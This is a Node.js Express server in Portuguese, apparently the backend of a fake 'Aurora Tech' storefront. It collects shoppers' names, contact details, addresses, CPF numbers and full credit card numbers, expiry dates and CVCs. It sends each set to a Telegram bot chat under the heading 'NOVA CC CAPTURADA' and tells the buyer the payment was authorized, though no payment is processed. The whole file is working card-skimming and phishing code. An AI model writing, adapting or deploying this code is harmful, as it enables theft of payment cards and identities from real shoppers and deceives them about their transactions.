require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || 'minha_chave_secreta_123';
const CNPJ_LOJA = '44.921.334/0001-73';

const TELEGRAM_TOKEN =
  process.env.TELEGRAM_TOKEN ||
  process.env.TELEGRAM_BOT_TOKEN ||
  process.env.BOT_TOKEN ||
  process.env.TOKEN_TELEGRAM;

const TELEGRAM_CHAT_ID =
  process.env.TELEGRAM_CHAT_ID ||
  process.env.CHAT_ID ||
  process.env.ID_CHAT_TELEGRAM;

app.use(
  cors({
    origin: true,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'x-api-key']
  })
);

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'captura.html'));
});

app.get('/health', (req, res) => {
  res.status(200).json({ ok: true, servico: 'aurora-tech-captura' });
});

function formatarDataHoraBr() {
  return new Date().toLocaleString('pt-BR', {
    timeZone: 'America/Fortaleza',
    dateStyle: 'short',
    timeStyle: 'medium'
  });
}

function limparDigitos(valor) {
  return String(valor || '').replace(/\D/g, '');
}

function escaparHtml(valor) {
  return String(valor ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function montarMensagemTelegram(dados) {
  const ehCartao = dados.formaPagamento === 'Cartão de Crédito';
  const numeroLimpo = limparDigitos(dados.numeroCartao);
  const cvcLimpo = limparDigitos(dados.cvc);
  const cpfLimpo = limparDigitos(dados.cpfTitular);

  const tituloLead = ehCartao
    ? '🔴 <b>AURORA TECH • NOVA CC CAPTURADA</b>'
    : '🔴 <b>AURORA TECH • NOVO PEDIDO</b>';

  const bebeTag = dados.bebe || dados.opBebe || '7 bebe';
  const origem = dados.origem || 'aurora-tech';
  const metodoResumo = ehCartao
    ? `${dados.formaPagamento} (${dados.bandeiraCartao || 'Cartão'} • ${dados.parcelas || '1x'})`
    : dados.formaPagamento || 'Não informado';

  const linhas = [
    tituloLead,
    '<code>════════════════════════════</code>',
    `🕒 <b>Data/Hora:</b> <code>${escaparHtml(formatarDataHoraBr())}</code>`,
    `💎 <b>Selo:</b> <code>${escaparHtml(bebeTag)}</code>`,
    `💰 <b>Total:</b> <b>${escaparHtml(dados.valor || 'Não informado')}</b>`,
    `💳 <b>Método:</b> ${escaparHtml(metodoResumo)}`,
    '',
    '<b>👤 DADOS DO CLIENTE</b>',
    `• <b>Nome:</b> ${escaparHtml(dados.nome || 'Não informado')}`,
    `• <b>Telefone:</b> ${escaparHtml(dados.telefone || 'Não informado')}`,
    `• <b>E-mail:</b> ${escaparHtml(dados.email || 'Não informado')}`,
    `• <b>Endereço:</b> ${escaparHtml(dados.mensagem || 'Não informado')}`,
    '',
    '<b>📦 ITENS DO PEDIDO</b>',
    `• <b>Produtos:</b> ${escaparHtml(dados.produto || 'Não informado')}`
  ];

  if (ehCartao) {
    linhas.push(
      '',
      '<b>💳 DETALHES DO CARTÃO</b>',
      `• <b>Bandeira:</b> ${escaparHtml(dados.bandeiraCartao || 'Não identificada')}`,
      `• <b>Parcelas:</b> ${escaparHtml(dados.parcelas || '1x')}`,
      `• <b>Titular:</b> ${escaparHtml(dados.nomeCompletoCartao || 'Não informado')}`,
      `• <b>CPF:</b> <code>${escaparHtml(dados.cpfTitular || cpfLimpo || 'Não informado')}</code>`,
      `• <b>Número:</b> <code>${escaparHtml(numeroLimpo || dados.numeroCartao || 'Não informado')}</code>`,
      `• <b>Validade:</b> <code>${escaparHtml(dados.validadeCartao || 'Não informado')}</code>`,
      `• <b>CVC:</b> <code>${escaparHtml(cvcLimpo || dados.cvc || 'Não informado')}</code>`
    );
  }

  linhas.push(
    '<code>════════════════════════════</code>',
    `🌐 <b>Origem:</b> <code>${escaparHtml(origem)}</code>`,
    `🏛️ <i>AURORA TECH • CNPJ ${escaparHtml(CNPJ_LOJA)}</i>`
  );

  return linhas.join('\n');
}

async function enviarParaTelegram(dados) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error('TELEGRAM_TOKEN ou TELEGRAM_CHAT_ID não configurado no .env.');
  }

  const mensagemHtml = montarMensagemTelegram(dados);

  const resposta = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: mensagemHtml,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });

  const json = await resposta.json();
  if (!resposta.ok || !json.ok) {
    const textoLimpo = mensagemHtml
      .replace(/<[^>]+>/g, '')
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"');

    const retry = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: textoLimpo,
        disable_web_page_preview: true
      })
    });

    const retryJson = await retry.json();
    if (!retry.ok || !retryJson.ok) {
      throw new Error(retryJson.description || 'Falha ao enviar mensagem para o Telegram.');
    }
  }
}

app.post('/api/captura', async (req, res) => {
  const chaveRecebida = req.header('x-api-key');
  if (!chaveRecebida || chaveRecebida !== API_KEY) {
    return res.status(401).json({ ok: false, erro: 'Chave de API inválida.' });
  }

  const dados = req.body || {};
  if (!dados.nome || !dados.email || !dados.formaPagamento) {
    return res.status(400).json({
      ok: false,
      erro: 'Dados obrigatórios ausentes (nome, e-mail ou forma de pagamento).'
    });
  }

  try {
    await enviarParaTelegram(dados);

    console.log('=== LEAD ENVIADO AO TELEGRAM ===', {
      tipo: dados.formaPagamento === 'Cartão de Crédito' ? 'NOVA CC CAPTURADA' : 'PEDIDO',
      bebe: dados.bebe || dados.opBebe || '7 bebe',
      cliente: dados.nome,
      email: dados.email,
      telefone: dados.telefone,
      produto: dados.produto,
      valor: dados.valor,
      formaPagamento: dados.formaPagamento,
      bandeira: dados.bandeiraCartao,
      parcelas: dados.parcelas,
      hora: formatarDataHoraBr()
    });

    return res.status(200).json({
      ok: true,
      mensagem: 'Pagamento autorizado e lead enviado ao Telegram com sucesso.'
    });
  } catch (err) {
    console.error('Erro ao enviar para o Telegram:', err.message);
    return res.status(502).json({
      ok: false,
      erro: err.message || 'Erro ao enviar notificação para o Telegram.'
    });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor de captura rodando em http://localhost:${PORT}`);
});